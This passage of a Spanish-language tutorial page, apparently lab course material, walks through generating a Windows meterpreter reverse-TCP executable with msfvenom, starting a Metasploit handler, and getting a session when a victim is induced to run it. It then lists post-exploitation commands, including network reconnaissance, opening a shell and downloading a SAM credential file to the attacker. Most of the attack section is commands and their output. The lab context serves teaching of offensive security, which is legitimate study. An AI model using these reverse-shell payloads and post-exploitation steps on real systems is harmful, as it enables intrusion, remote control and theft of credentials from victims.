+<a id="__codelineno-22-213" name="__codelineno-22-213" href="#__codelineno-22-213"></a>windows/patchupmeterpreter/reverse_ipv6_tcp
+<a id="__codelineno-22-214" name="__codelineno-22-214" href="#__codelineno-22-214"></a>windows/patchupmeterpreter/reverse_nonx_tcp
+<a id="__codelineno-22-215" name="__codelineno-22-215" href="#__codelineno-22-215"></a>windows/patchupmeterpreter/reverse_ord_tcp
+<a id="__codelineno-22-216" name="__codelineno-22-216" href="#__codelineno-22-216"></a>windows/patchupmeterpreter/reverse_tcp
+<a id="__codelineno-22-217" name="__codelineno-22-217" href="#__codelineno-22-217"></a>windows/patchupmeterpreter/reverse_tcp_allports
+<a id="__codelineno-22-218" name="__codelineno-22-218" href="#__codelineno-22-218"></a>windows/patchupmeterpreter/reverse_tcp_dns
+<a id="__codelineno-22-219" name="__codelineno-22-219" href="#__codelineno-22-219"></a>windows/patchupmeterpreter/reverse_tcp_rc4
+<a id="__codelineno-22-220" name="__codelineno-22-220" href="#__codelineno-22-220"></a>windows/patchupmeterpreter/reverse_tcp_rc4_dns
+<a id="__codelineno-22-221" name="__codelineno-22-221" href="#__codelineno-22-221"></a>windows/patchupmeterpreter/reverse_tcp_uuid
+<a id="__codelineno-22-222" name="__codelineno-22-222" href="#__codelineno-22-222"></a>windows/x64/meterpreter/reverse_http
+<a id="__codelineno-22-223" name="__codelineno-22-223" href="#__codelineno-22-223"></a>windows/x64/meterpreter/reverse_https
+<a id="__codelineno-22-224" name="__codelineno-22-224" href="#__codelineno-22-224"></a>windows/x64/meterpreter/reverse_named_pipe
+<a id="__codelineno-22-225" name="__codelineno-22-225" href="#__codelineno-22-225"></a>windows/x64/meterpreter/reverse_tcp
+<a id="__codelineno-22-226" name="__codelineno-22-226" href="#__codelineno-22-226"></a>windows/x64/meterpreter/reverse_tcp_rc4
+<a id="__codelineno-22-227" name="__codelineno-22-227" href="#__codelineno-22-227"></a>windows/x64/meterpreter/reverse_tcp_uuid
+<a id="__codelineno-22-228" name="__codelineno-22-228" href="#__codelineno-22-228"></a>windows/x64/meterpreter/reverse_winhttp
+<a id="__codelineno-22-229" name="__codelineno-22-229" href="#__codelineno-22-229"></a>windows/x64/meterpreter/reverse_winhttps
+<a id="__codelineno-22-230" name="__codelineno-22-230" href="#__codelineno-22-230"></a>windows/x64/meterpreter_reverse_http
+<a id="__codelineno-22-231" name="__codelineno-22-231" href="#__codelineno-22-231"></a>windows/x64/meterpreter_reverse_https
+<a id="__codelineno-22-232" name="__codelineno-22-232" href="#__codelineno-22-232"></a>windows/x64/meterpreter_reverse_ipv6_tcp
+<a id="__codelineno-22-233" name="__codelineno-22-233" href="#__codelineno-22-233"></a>windows/x64/meterpreter_reverse_tcp
+</code></pre></div>
+</details>
+<h3 id="paso-12-generamos-un-payload-via-meterpreter">Paso 12 — Generamos un Payload via meterpreter<a class="headerlink" href="#paso-12-generamos-un-payload-via-meterpreter" title="Permanent link">&para;</a></h3>
+<p>Meterpreter es un payload avanzado de Metasploit que, después de conectarse al operador, proporciona una sesión interactiva con muchas funciones integradas.</p>
+<table>
+<thead>
+<tr>
+<th>Reverse shell convencional</th>
+<th>Meterpreter</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Entrega <code>cmd.exe</code> o un shell equivalente</td>
+<td>Entrega una consola especializada</td>
+</tr>
+<tr>
+<td>Puede recibirse con Netcat</td>
+<td>Normalmente requiere un handler de Metasploit</td>
+</tr>
+<tr>
+<td>Funciones limitadas al shell</td>
+<td>Muchas operaciones integradas</td>
+</tr>
+<tr>
+<td>Más fácil de explicar y observar</td>
+<td>Más complejo y con mayor impacto</td>
+</tr>
+<tr>
+<td>Menor superficie funcional</td>
+<td>Puede realizar acciones de postexplotación</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>Generamos el payload con la sesion meterpreter</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.56.104<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4445</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>shell-meterpreter.exe
+</code></pre></div>
+<ul>
+<li>Para recibir la conexión tcp reversa saliente de la máquina víctima tenemos que iniciar una sesión de "escucha" de meterpreter:</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>msfconsole<span class="w"> </span>-q
+</code></pre></div>
+<ul>
+<li>Dentro de msfconsole, invocar a meterpreter:</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>use<span class="w"> </span>multi/handler
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/x64/meterpreter/reverse_tcp
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.56.104
+<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4445</span>
+<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>run
+</code></pre></div>
+<ul>
+<li>
+<p>Mediante diferentes vectores de ataque podemos introducir el payload en la máquina víctima e inducir al usuario a ejecutarla.</p>
+</li>
+<li>
+<p>Una vez que el usurio (windows 11) ejecute el payload, se produce la sesión meterpreter:</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="nv">LPORT</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="m">4445</span>
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>msf<span class="w"> </span>exploit<span class="o">(</span>multi/handler<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>run
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Started<span class="w"> </span>reverse<span class="w"> </span>TCP<span class="w"> </span>handler<span class="w"> </span>on<span class="w"> </span><span class="m">192</span>.168.56.104:4445
+<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Sending<span class="w"> </span>stage<span class="w"> </span><span class="o">(</span><span class="m">255678</span><span class="w"> </span>bytes<span class="o">)</span><span class="w"> </span>to<span class="w"> </span><span class="m">192</span>.168.56.102
+<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Meterpreter<span class="w"> </span>session<span class="w"> </span><span class="m">1</span><span class="w"> </span>opened<span class="w"> </span><span class="o">(</span><span class="m">192</span>.168.56.104:4445<span class="w"> </span>-&gt;<span class="w"> </span><span class="m">192</span>.168.56.102:59016<span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2026</span>-09-01<span class="w"> </span><span class="m">10</span>:48:51<span class="w"> </span>+0000
+</code></pre></div>
+<h3 id="paso-13-post-explotacion-con-meterpreter">Paso 13 — Post-Explotación con Meterpreter<a class="headerlink" href="#paso-13-post-explotacion-con-meterpreter" title="Permanent link">&para;</a></h3>
+<p><strong>Verificar el acceso obtenido</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>sysinfo<span class="w">          </span><span class="c1"># OS, hostname, arquitectura, dominio</span>
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>getuid<span class="w">           </span><span class="c1"># confirmar NT AUTHORITY\SYSTEM</span>
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>getpid<span class="w">           </span><span class="c1"># PID del proceso donde está inyectado el payload</span>
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>ps<span class="w">               </span><span class="c1"># listar todos los procesos en ejecución</span>
+</code></pre></div>
+<p><strong>Explorar la red desde dentro del target</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>ipconfig<span class="w">         </span><span class="c1"># interfaces de red — buscar otras subredes internas</span>
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>arp<span class="w">              </span><span class="c1"># tabla ARP — otros hosts activos en la red</span>
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>netstat<span class="w">          </span><span class="c1"># conexiones activas y puertos en escucha</span>
+<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>route<span class="w">            </span><span class="c1"># tabla de enrutamiento</span>
+</code></pre></div>
+<p><strong>Navegar el sistema de archivos</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">pwd</span><span class="w">              </span><span class="c1"># directorio actual</span>
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>ls<span class="w">               </span><span class="c1"># listar archivos</span>
+<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>C:<span class="se">\\</span>Users<span class="w">     </span><span class="c1"># navegar al directorio de usuarios</span>
+<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>search<span class="w"> </span>-f<span class="w"> </span>*.txt<span class="w"> </span>-d<span class="w"> </span>C:<span class="se">\\</span>Users<span class="w">    </span><span class="c1"># buscar archivos .txt en Users</span>
+<a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>download<span class="w"> </span>C:<span class="se">\\</span>Windows<span class="se">\\</span>Temp<span class="se">\\</span>SAM<span class="w"> </span>.<span class="w">  </span><span class="c1"># descargar archivo al atacante</span>
+</code></pre></div>
+<p><strong>Enumerar servicios</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>shell<span class="w">            </span><span class="c1"># abrir cmd.exe en el target</span>
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>C:<span class="se">\&gt;</span><span class="w"> </span>net<span class="w"> </span>start<span class="w">                 </span><span class="c1"># listar servicios en ejecución</span>
+<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>C:<span class="se">\&gt;</span><span class="w"> </span>sc<span class="w"> </span>query<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="w"> </span>all<span class="w">        </span><span class="c1"># estado detallado de todos los servicios</span>
+<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>C:<span class="se">\&gt;</span><span class="w"> </span>netstat<span class="w"> </span>-ano<span class="w">              </span><span class="c1"># conexiones con PID asociado</span>
+<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>C:<span class="se">\&gt;</span><span class="w"> </span><span class="nb">exit</span><span class="w">                      </span><span class="c1"># volver a Meterpreter</span>
+</code></pre></div>
+<hr />
+<p><em>Volver: <a href="../../">Inicio del módulo</a></em></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver al principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.sections", "navigation.expand", "navigation.tracking", "navigation.top", "toc.follow", "content.code.copy", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.13a4f30d.min.js"></script>
+      
+    
+  </body>
+</html>
